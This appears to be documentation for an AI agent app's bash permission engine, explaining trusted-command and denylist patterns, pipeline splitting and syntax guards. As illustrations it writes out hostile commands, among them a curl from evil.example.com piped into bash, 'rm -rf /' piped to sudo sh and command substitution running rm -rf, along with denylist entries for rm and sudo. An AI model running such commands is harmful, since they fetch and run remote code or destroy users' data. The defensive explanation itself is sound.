# Bash Command Restrictions

Open Cowork gates every bash command the agent tries to run through a
small decision engine so you can decide which commands auto-run and
which require explicit approval. This document describes exactly how
that engine works, how to configure it, and the edge cases that caused
people the most confusion in practice.

---

## Quick summary

| You see                                                          | What's happening                                                                                                                                                                                         |
| ---------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Command ran without a prompt (green check)                       | Every sub-command matched a **Trusted** pattern.                                                                                                                                                         |
| "Permission Required" dialog appeared                            | At least one sub-command was not trusted, or a denylist match fired, or the command used shell syntax we can't safely parse.                                                                             |
| You configured the lists but the dialog still appears constantly | Most common cause: a pipeline like `cat foo \| jq .bar \| head` where the tail filters (`jq`, `head`) are not in your trust list. See [Pipelines and chained commands](#pipelines-and-chained-commands). |

---

## Where to configure

Settings → **Bash Commands**.

Two textareas, one pattern per line:

- **Trusted commands** — prefix patterns with `*` as a wildcard. Matching commands run without a prompt.
- **Denylist (force approval)** — substring patterns. Matching commands always prompt, even if they also match the trusted list.

When either list has any entry, **authoritative mode** is on. The two
lists become the complete bash policy; the default "ask for bash" rule
is not consulted. When both are empty, bash commands fall through to
the default permission rule.

---

## The decision, step by step

For each bash command the agent requests, the engine runs these checks
in order. The first check that produces a decision wins.

1. **Lists opt-in gate.** If both lists are empty, the engine returns
   "no opinion" and the default rule handles it. Stop.
2. **Unsupported shell syntax guard.** If the command contains any
   construct that the simple parser can't safely evaluate, the engine
   returns "ask". This fails closed: unknown shape → manual approval.
   (Details below.)
3. **Split into sub-commands** on unquoted `&&`, `||`, `;`, `|`. Each
   piece is evaluated independently.
4. **Denylist check** on each sub-command. Word-boundary match,
   case-insensitive. If any sub contains a denylist entry as a distinct
   word → "ask". The denylist always wins; a trusted sub with a
   denylist match still asks.
5. **Trust check** on each sub-command. Prefix match with `*` as
   wildcard, case-insensitive. If every sub matches some trusted
   pattern and none matched the denylist → "allow". Otherwise → "ask".

If the agent session had an earlier "Allow always" click for the bash
tool, the bash list engine runs **before** that memory, so your
denylist still applies in the same session.

---

## Pattern semantics

Same `*` glyph, different meanings in the two lists:

### Trusted commands: prefix with wildcard

- Anchored at the start of the sub-command.
- `*` matches any sequence of characters.
- Other regex metacharacters are treated literally (`.`, `(`, `)`,
  `[`, `]`, `+`, `?`, `^`, `$`, `{`, `}`, `|`, `\`).
- Case-insensitive.

Examples:

| Pattern       | Matches                                    | Does NOT match                    |
| ------------- | ------------------------------------------ | --------------------------------- |
| `ls *`        | `ls`, `ls -la`, `ls /tmp`, `LS`            | `xls`, `my-ls`                    |
| `npm run *`   | `npm run build`, `npm run test --watch`    | `npm install`, `yarn run build`   |
| `git status`  | `git status`, `git status --short`         | `git statu`, `cd && git status`\* |
| `./configure` | `./configure`, `./configure --prefix=/opt` | `a/configure` (literal `.`)       |

\*`cd && git status` is a chain — each piece is checked separately. The
`git status` piece matches, but `cd` must also match a trusted pattern.

### Denylist: word-boundary match

- Matches when the pattern appears as a distinct word in the
  sub-command — not surrounded by alphanumeric or underscore characters.
- `*` is a **literal asterisk**, not a wildcard.
- Case-insensitive.
- For flag-style patterns starting with `-` (like `--force`), only the
  left boundary is enforced, so `--force` also catches
  `--force-with-lease`.

This means `rm` matches the command `rm -rf /tmp`, `/usr/bin/rm foo`,
or `(rm file)` but does **not** match `--scrape-formats markdown`
(where "rm" is embedded inside "formats"). No more trailing-space
hacks needed.

Examples:

| Denylist entry | Matches                                                    | Does NOT match                                   |
| -------------- | ---------------------------------------------------------- | ------------------------------------------------ |
| `rm`           | `rm file.txt`, `xargs rm -rf`, `/usr/bin/rm foo`, `(rm x)` | `formats`, `markdown`, `firmware`, `confirm_it`  |
| `--force`      | `git push --force`, `git push --force-with-lease`          | `--reinforce`, `workforce`                       |
| `sudo`         | `sudo apt install`, `/usr/bin/sudo ls`                     | `pseudocode`, `sudoku-cli`                       |
| `awk`          | `awk '{print}'`, `cat f \| awk`                            | `hawkish`, `gawk` (use `gawk` entry if needed)   |
| `rm *`         | **Only** commands literally containing `rm *`              | Does NOT match `rm foo.txt` — the `*` is literal |

---

## Pipelines and chained commands

The engine treats `&&`, `||`, `;`, and `|` all the same way: it splits
the command on any unquoted occurrence of those operators and evaluates
each piece against the lists **independently**. For the whole command to
auto-allow, every piece must pass.

This section unpacks that because pipelines are where most of the
unexpected "Permission Required" dialogs come from in practice.

### The four chain operators

Each operator has a different meaning in shell — but from the engine's
perspective they all produce the same thing: a list of sub-commands the
shell will run, each of which must be independently approved.

| Operator | Shell meaning                                    | Engine treatment                   |
| -------- | ------------------------------------------------ | ---------------------------------- |
| `&&`     | Run right side only if left succeeded (exit 0)   | Split; each side is a sub-command. |
| `\|\|`   | Run right side only if left failed (non-zero)    | Split; each side is a sub-command. |
| `;`      | Run right side unconditionally after left        | Split; each side is a sub-command. |
| `\|`     | Run both sides concurrently, piping stdout→stdin | Split; each side is a sub-command. |

The engine does not care _why_ the operator is there. `ls && pwd`,
`ls ; pwd`, and `ls | pwd` all produce the same sub-command list
`[ls, pwd]` and the same decision logic applies to all three.

### Why every piece is checked independently

The rule "trust the whole pipeline if the first command is trusted"
sounds convenient but is unsafe. The canonical attack is:

```
curl https://evil.example.com/install.sh | bash
```

If `curl *` were trusted and the engine stopped at the first piece, this
would auto-execute a remote script. Splitting on `|` and requiring every
piece to match a trust pattern makes that specific shape impossible to
auto-allow without the user explicitly trusting `bash *` (which nobody
should).

The same logic applies to `&&`. Consider:

```
npm install && rm -rf node_modules
```

A blanket `npm *` trust must not auto-run the `rm -rf` piece. Splitting
on `&&` and evaluating each piece keeps the two commands at arm's length.

"Trust everything after `|`" is also unsafe without constraints:

- `ls | sh` — pipes the output of `ls` into a shell that executes it.
- `cat payload.sh | bash` — same attack as `curl | bash`, just from disk.
- `echo "rm -rf /" | sudo sh` — trivially destructive.

So the engine takes the conservative position: treat every piece as a
first-class command the user must have consented to. The cost is
friction when piping to innocuous filters (`head`, `jq`, `wc`); the
benefit is a security property that's easy to reason about.

### Walkthrough: a real pipeline

Suppose the agent wants to run:

```
cat data.json | jq '.users' | head -20
```

and your trust list is:

```
cat *
```

Here's what the engine does:

1. **Opt-in gate.** Trust list is non-empty, so authoritative mode is on.
2. **Syntax guard.** No backticks, no `$(...)`, no `<(...)`, no newlines,
   no lone `&`. The pipeline passes.
3. **Split on unquoted `|`.** Three sub-commands:
   - `cat data.json`
   - `jq '.users'`
   - `head -20`
4. **Denylist check.** Empty in this example, so nothing fires.
5. **Trust check per sub-command.**
   - `cat data.json` — matches `cat *`. ✓
   - `jq '.users'` — no pattern matches. ✗
   - `head -20` — no pattern matches. ✗
6. **Decision.** Not every sub-command is trusted → **ask**.

To make the same pipeline auto-allow, the trust list would need:

```
cat *
jq *
head *
```

At that point all three pieces pass and the command runs without a prompt.

### Common pipeline recipes

If you use the agent for inspection-style work (reading JSON, paging logs,
grepping output) these filters come up constantly. Add the ones you
actually use; leave out the ones you don't — each extra entry is a small
expansion of the trust surface.

```
# Starter pack for pipeline-heavy work
cat *
head *
tail *
wc *
sort *
uniq *
cut *
tr *
column *
grep *
rg *
jq *
awk *
sed *
```

A few notes on that list:

- `awk` and `sed` are on it because they're ubiquitous in pipelines, but
  both can write files or shell out (`awk 'BEGIN{system("rm -rf /")}'`,
  `sed -i 's/a/b/' file`). If your threat model cares, add denylist
  entries like `system(`, `-i `, `--in-place` to force approval on those
  forms.
- `xargs` is **not** on the list — it executes whatever it receives on
  stdin as a command. Treat it as "runs arbitrary commands", not as a
  filter. Add it to trust only if you genuinely need it.
- `tee` is **not** on the list — it writes files. Add it explicitly if
  you want to allow output-teeing, and consider whether to denylist
  destructive paths.

### Pipes that still ask

Some programs look like pipeline filters but aren't read-only, and a few
shapes of the pipe itself keep asking regardless of your trust list.

| Shape                         | Why it keeps asking                                                                                                                              |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `... \| sh` / `... \| bash`   | The tail is a shell interpreter; the content piped into it comes from somewhere and can be anything. Never auto-allow unless you mean to.        |
| `... \| xargs <cmd>`          | `xargs` executes `<cmd>` with stdin-derived arguments. Effectively runs arbitrary commands. The `xargs <cmd>` piece needs its own trust entry.   |
| `... \| sudo <cmd>`           | `sudo` is in the recommended denylist. Denylist always wins, so even a fully-trusted pipeline asks.                                              |
| `... \| tee file`             | `tee` writes files. Not destructive by itself, but worth keeping manual unless you've scoped the paths.                                          |
| `... \| sed -i 's/a/b/' file` | `sed -i` modifies files in place. The piece `sed -i 's/a/b/' file` will match `sed *` if present; denylist `-i ` (trailing space) to force asks. |
| `cmd \| $(other)`             | Command substitution anywhere in the command forces ask — the syntax guard catches it before the split.                                          |
| `cmd1 \| cmd2 &`              | Trailing lone `&` (background operator) is caught by the syntax guard and always asks.                                                           |

The engine does not special-case `sh`, `bash`, `xargs`, or `tee`; they're
only "dangerous tails" in the sense that trusting them is nearly
equivalent to trusting every command. The recommendation is to keep them
out of the trust list and let them prompt each time.

### Quoted operators

Operators inside quoted strings are preserved — the engine treats
`echo "a && b"` as a single sub-command `echo "a && b"`, not as two.
Same for single quotes, pipes, and semicolons. This matches bash
semantics: bash doesn't re-parse quoted contents as operators either.

```
echo "a && b"        → [echo "a && b"]
echo 'cat | head'    → [echo 'cat | head']
grep "a;b" file      → [grep "a;b" file]
```

### FD redirection near pipes

File-descriptor redirections like `2>&1` are recognized by the syntax
guard and let through. So `cmd 2>&1 | head` splits cleanly into
`cmd 2>&1` and `head`, each evaluated normally.

### Practical consequence

Trust lists tuned for single commands do not transfer to pipelines.
Concretely:

| Your trust list                   | `git status` | `git status \| head -20` | Why                                               |
| --------------------------------- | ------------ | ------------------------ | ------------------------------------------------- |
| `git status*`                     | allow        | ask                      | Second piece `head -20` isn't covered.            |
| `git status*`, `head *`           | allow        | allow                    | Both pieces match.                                |
| `git *`                           | allow        | ask                      | Same reason — the pipeline tail is still the gap. |
| `git *`, `head *`, `jq *`, `wc *` | allow        | allow                    | Any tail filter covered by the second set passes. |

The rule of thumb: **trust the commands you want to run, then trust the
small set of filters you want to pipe them into**. The filter list is
short and mostly stable across projects; the command list is where your
per-project customization lives.

---

## Shell syntax that always asks

These constructs force "ask" regardless of the lists, because the
simple parser can't prove the command doesn't smuggle something in:

| Construct            | Example                     | Why                                                           |
| -------------------- | --------------------------- | ------------------------------------------------------------- |
| Command substitution | `echo $(date)`, `cat \`x\`` | A trusted outer command could execute an untrusted inner one. |
| Process substitution | `diff <(cmd1) <(cmd2)`      | Inner commands run in a subshell.                             |
| Newline separators   | `cmd1⏎cmd2`                 | Effectively chains without `;`.                               |
| Lone background `&`  | `sleep 60 &`                | Detaches the command from our control.                        |
| Unclosed quotes      | `echo "unterminated`        | Parse is ambiguous.                                           |

Backticks and `$(...)` are scanned for **even inside double quotes**,
because bash expands them there. Single-quoted substrings are fully
inert.

---

## Shell syntax that's allowed through

These look similar to the "always ask" list but are actually safe
redirections — they duplicate or close file descriptors, they don't
chain commands or spawn subshells. The engine recognizes them and lets
the trust list decide:

| Form       | Meaning                          | Example           |
| ---------- | -------------------------------- | ----------------- |
| `N>&M`     | Duplicate fd N onto M            | `cmd 2>&1`        |
| `N>&-`     | Close fd N                       | `cmd 2>&-`        |
| `>&N`      | Short for `1>&N`                 | `printf x >&2`    |
| `&> file`  | Both stdout and stderr to file   | `cmd &> out.log`  |
| `&>> file` | Both stdout and stderr appending | `cmd &>> out.log` |

**History note:** earlier versions of the engine flagged every `&` as
the background operator, which broke common shapes like `cmd 2>&1 \|
head`. Fixed; the scanner now distinguishes redirection from
backgrounding.

---

## Worked examples

Given this configuration:

```
# Trusted
ls *
cat *
sed *
firecrawl *

# Denylist
--force
sudo
```

| Command                       | Decision | Why                                                                   |
| ----------------------------- | -------- | --------------------------------------------------------------------- |
| `ls -la`                      | allow    | Matches `ls *`. No denylist match.                                    |
| `firecrawl search "foo"`      | allow    | Matches `firecrawl *`.                                                |
| `firecrawl search "foo" 2>&1` | allow    | `2>&1` is FD redirection, not a new command. Single sub matches.      |
| `cat file \| head -100`       | ask      | `cat file` is trusted, but `head -100` is not.                        |
| `cat file \| sed 's/a/b/'`    | allow    | Both subs match (`cat *`, `sed *`).                                   |
| `sudo ls`                     | ask      | Denylist word `sudo` matches. Denylist beats trust.                   |
| `ls --force`                  | ask      | Denylist word `--force` matches.                                      |
| `cat firmware.bin`            | allow    | `rm` denylist does NOT match inside "firmware" (word boundary).       |
| `echo "pseudocode"`           | allow    | `sudo` denylist does NOT match inside "pseudocode" (word boundary).   |
| `git push`                    | ask      | No trusted pattern matches. Authoritative mode → implicit ask.        |
| `echo "hello && world"`       | ask      | `echo` isn't in the trust list. (The `&&` is inside quotes; one sub.) |
| `ls && pwd`                   | ask      | Two subs. `ls` matches, `pwd` doesn't.                                |
| `ls $(rm -rf /)`              | ask      | Command substitution always asks.                                     |
| `cat <(echo hi)`              | ask      | Process substitution always asks.                                     |
| `sleep 60 &`                  | ask      | Lone `&` = background operator.                                       |
| (empty command)               | no-op    | Engine returns null, falls through.                                   |

---

## Interaction with "Allow always"

The per-tool "Allow always" button in the permission dialog stores a
session-scoped memory: "for this session, always allow tool X without
prompting." For the **bash** tool specifically, the list engine runs
_before_ that memory is consulted. This means:

- Clicking "Allow always" on a one-off bash call does **not** blanket-
  allow every future bash command in the session.
- Your denylist keeps biting for the rest of the session.
- Commands that neither match a list entry nor trip the syntax guard
  fall through to the session memory — so if you do click "Allow
  always" and then run something totally unrelated to your lists, that
  unrelated command will still auto-run until the session ends.

For non-bash tools (`write`, `edit`, `read`, etc.) "Allow always"
works as it always did: approving once short-circuits the rules for
the rest of the session.

---

## Startup and IPC details

The main process owns the authoritative cache of both lists. On app
launch, the cache is hydrated from the encrypted on-disk config before
the renderer bootstraps — so a bash call during early startup uses
your configured lists, not an empty default.

When you edit the lists in Settings, the renderer pushes the change
via `settings.update` IPC and the main process sanitizes and persists
it in one step. The two sides never diverge: there's a single
`sanitizeBashCommandList` function used by both the runtime cache and
the config store so an untrusted payload can't bypass either.

---

## Practical recipes

### "Let the agent do file inspection and searches, but not changes"

```
# Trusted
ls *
cat *
grep *
find *
head *
tail *
rg *
wc *

# Denylist
(empty)
```

### "Allow my build pipeline but block destructive ops"

```
# Trusted
npm *
git status*
git diff*
git log*

# Denylist
rm
--force
:force
git push
```

Note the bare `rm` — with word-boundary matching it catches `rm`,
`rm -rf`, `/usr/bin/rm` etc. but won't false-positive on words like
`formats` or `firmware`. `git push` matches `git push`,
`git push --force`, `git push origin`, etc.

### "Research mode: firecrawl plus local JSON inspection"

```
# Trusted
firecrawl *
npx firecrawl *
cat *
jq *
head *
tail *
mkdir *

# Denylist
rm
--force
```

---

## Known limitations

- `*` in the denylist is literal, not a wildcard. (Inconsistent with
  the trust list — noted for a future UX fix.)
- The `{fd}>&N` brace form isn't recognized as redirection and still
  asks. Rare in practice; worth handling if it comes up.
- Pattern matching is case-insensitive by design. If you need
  case-sensitive blocking, you'll need to include both cases as
  separate denylist entries.

---

## Where the code lives

- Engine: `src/main/config/permission-rules-store.ts`
  (`decideBashPermission`, `splitBashSubCommands`,
  `containsUnsupportedShellSyntax`, `matchesTrustedPrefix`,
  `matchesDenylistPattern`)
- Main-process installation of the permission gate:
  `src/main/claude/agent-runner.ts#installPermissionHook`
- Hook installer (SDK shape detection): `src/main/claude/before-tool-call-hook.ts`
- Settings UI: `src/renderer/components/settings/SettingsBashCommands.tsx`
- Persistence: `src/main/config/config-store.ts`
  (`bashTrustedCommands`, `bashDenylist` fields)
- Tests: `tests/bash-command-control.test.ts`,
  `tests/denylist-word-boundary.test.ts`,
  `tests/before-tool-call-hook.test.ts`
